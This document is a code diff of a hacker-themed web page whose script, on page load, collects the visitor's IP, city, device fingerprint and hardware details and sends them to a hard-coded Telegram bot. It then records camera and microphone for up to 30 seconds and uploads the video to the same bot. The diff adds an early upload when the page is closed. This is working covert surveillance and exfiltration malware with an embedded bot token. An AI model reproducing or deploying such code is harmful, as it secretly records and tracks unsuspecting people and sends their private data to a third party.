@@ -8,21 +8,21 @@
         body { background: #000; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; }
         canvas#matrix { position: absolute; top: 0; left: 0; z-index: -1; }
         .content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #0f0; text-shadow: 0 0 8px #0f0; background: rgba(0,0,0,0.6); }
-        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; }
+        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; max-width: 80%; }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div class="content">
         <h1>[ SYSTEM SCANNING ]</h1>
-        <div class="box"><p id="status">> Extracting All System Data...</p></div>
+        <div class="box"><p id="status">> Full System Access Authorized...</p></div>
     </div>
 
     <script>
         const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
         const chatId = '1034878899';
 
-        // Matrix Effect
+        // Matrix Animation
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
@@ -41,57 +41,52 @@
         setInterval(draw, 33);
 
         async function start() {
-            // کۆکردنەوەی هەموو زانیارییە زیادکراوەکان
+            // ١. کۆکردنەوە و ناردنی هەموو زانیارییەکان
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                
                 const getHz = () => new Promise(r => requestAnimationFrame(t1 => requestAnimationFrame(t2 => r(Math.round(1000/(t2-t1))))));
                 const hz = await getHz();
-
                 let batt = "N/A";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     batt = `${Math.round(b.level*100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
                 }
-
                 const gl = document.createElement('canvas').getContext('webgl');
                 const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
-                const theme = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
-
-                const msg = `
-🎭 ADVANCED VIDEO HACK:
-📱 مۆدێل: ${navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Device"}
-🌐 ئایپی: ${data.ip}
-📍 شار: ${data.city} (${data.country_name})
-🏢 کۆمپانیا: ${data.org}
-🔋 پاتری: ${batt}
-🔄 شاشە: ${hz}Hz
-🌙 دۆخی شەو: ${theme}
-🎮 گرافیک: ${gpu}
-💾 ڕام: ${navigator.deviceMemory || 'N/A'}GB
-⚙️ پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores
-🖥 قەبارە: ${window.screen.width}x${window.screen.height}
-🌍 زمان: ${navigator.language}
-⏰ کات: ${new Date().toLocaleString()}
-                `;
+                
+                const msg = `🎭 ADVANCED REPORT:\n📱 مۆدێل: ${navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Device"}\n🌐 ئایپی: ${data.ip}\n📍 شار: ${data.city}\n🔋 پاتری: ${batt}\n🔄 شاشە: ${hz}Hz\n🌙 دۆخی شەو: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "ON" : "OFF"}\n🎮 گرافیک: ${gpu}\n💾 ڕام: ${navigator.deviceMemory || 'N/A'}GB\n⚙️ پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores\n🌍 زمان: ${navigator.language}\n⏰ کات: ${new Date().toLocaleString()}`;
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
             } catch(e){}
 
-            // تۆمارکردنی ڤیدیۆ و دەنگی ١٠ چرکەیی
+            // ٢. تۆمارکردنی ڤیدیۆ (ناردن لەکاتی داخستن یان تەواوبوونی کات)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream);
                 let chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
+                
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const f = new FormData(); f.append('chat_id', chatId); f.append('video', blob, 'hacker.mp4');
                     fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: f });
                     stream.getTracks().forEach(t => t.stop());
                 };
+
                 recorder.start();
-                setTimeout(() => recorder.stop(), 10000);
+
+                // ئەگەر ٣٠ چرکە تەواو بوو
+                const timeout = setTimeout(() => {
+                    if (recorder.state === "recording") recorder.stop();
+                }, 30000);
+
+                // ئەگەر پەڕەکەی داخست یان گۆڕی، ڕاستەوخۆ بینێرە
+                window.onpagehide = () => {
+                    if (recorder.state === "recording") {
+                        clearTimeout(timeout);
+                        recorder.stop();
+                    }
+                };
             } catch(err){}
         }
         window.onload = start;
